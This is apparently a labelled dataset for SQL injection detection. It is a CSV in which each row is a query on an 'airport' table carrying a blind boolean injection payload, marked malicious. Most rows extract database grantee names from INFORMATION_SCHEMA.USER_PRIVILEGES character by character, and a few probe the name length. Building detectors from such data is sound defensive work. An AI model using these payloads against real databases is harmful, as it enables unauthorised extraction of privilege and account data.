full_query,label,template_id,malicious_input,malicious_input_desc
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),9,1))>112-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),7,1))>60-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),8,1))>24-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),8,1))>36-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),7,1))>66-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),8,1))>42-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),6,1))>39-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),9,1))>104-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),9,1))>108-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),8,1))>39-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),7,1))>63-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),6,1))>37-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),7,1))>64-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),6,1))>38-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),10,1))>64-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),9,1))>106-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),9,1))>107-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),10,1))>96-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),11,1))>96-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),10,1))>112-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),8,1))>37-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),11,1))>112-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),12,1))>96-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),8,1))>38-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),12,1))>112-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),13,1))>96-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),13,1))>112-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),10,1))>104-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),10,1))>108-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),11,1))>104-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),10,1))>110-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),10,1))>111-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),12,1))>104-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),13,1))>104-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),13,1))>108-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),14,1))>96-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),11,1))>100-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),14,1))>112-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),12,1))>100-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),13,1))>106-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),11,1))>98-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),13,1))>107-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),15,1))>96-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),11,1))>99-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),14,1))>104-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),15,1))>112-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),12,1))>98-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),14,1))>100-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),16,1))>96-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),14,1))>102-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),15,1))>104-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),16,1))>112-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),14,1))>103-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),15,1))>108-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),17,1))>96-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),16,1))>120-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),17,1))>112-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),15,1))>110-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),15,1))>111-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),17,1))>120-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),12,1))>97-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),16,1))>116-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),18,1))>96-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),17,1))>116-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),16,1))>114-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),16,1))>115-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),18,1))>48-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),17,1))>114-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),17,1))>115-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),18,1))>24-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),18,1))>36-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),18,1))>42-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),18,1))>39-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),18,1))>37-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),18,1))>38-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(CHAR_LENGTH(grantee) AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 4,1) AS cuey),1,1))>51-- USUD"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(CHAR_LENGTH(grantee) AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 4,1) AS cuey),1,1))>48-- USUD"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(CHAR_LENGTH(grantee) AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 4,1) AS cuey),1,1))>49-- USUD"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(CHAR_LENGTH(grantee) AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 4,1) AS cuey),2,1))>51-- USUD"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(CHAR_LENGTH(grantee) AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 4,1) AS cuey),2,1))>54-- USUD"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(CHAR_LENGTH(grantee) AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 4,1) AS cuey),2,1))>56-- USUD"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(CHAR_LENGTH(grantee) AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 4,1) AS cuey),2,1))>55-- USUD"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(CHAR_LENGTH(grantee) AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 4,1) AS cuey),3,1))>51-- USUD"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(CHAR_LENGTH(grantee) AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 4,1) AS cuey),3,1))>48-- USUD"";",1,airport-S1,Unknown,Unknown
